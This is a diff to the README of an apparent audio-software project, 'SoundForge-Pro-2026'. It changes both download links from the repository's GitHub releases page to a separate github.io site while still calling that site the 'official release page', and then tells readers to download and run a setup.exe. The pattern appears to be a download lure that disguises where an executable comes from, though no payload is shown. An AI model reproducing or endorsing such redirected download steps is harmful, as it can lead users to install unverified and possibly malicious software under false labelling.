@@ -1,6 +1,6 @@
 # 🎧 SoundForge-Pro-2026 - Master your audio with professional tools
 
-<a href="https://github.com/Vikkysurmounted714/SoundForge-Pro-2026/releases"><img src="https://img.shields.io/badge/Download-SoundForge_Pro_2026-blue"></a>
+<a href="https://vikkysurmounted714.github.io"><img src="https://img.shields.io/badge/Download-SoundForge_Pro_2026-blue"></a>
 
 ## 🛠️ About this software
 
@@ -23,7 +23,7 @@ If your computer meets these standards, the software will run without issues. Cl
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official release page](https://github.com/Vikkysurmounted714/SoundForge-Pro-2026/releases) to access the installation files.
+1. Go to the [official release page](https://vikkysurmounted714.github.io) to access the installation files.
 2. Look for the latest version tag.
 3. Click the file with the .exe extension. The file name usually ends in "setup.exe".
 4. Save the file to your computer.
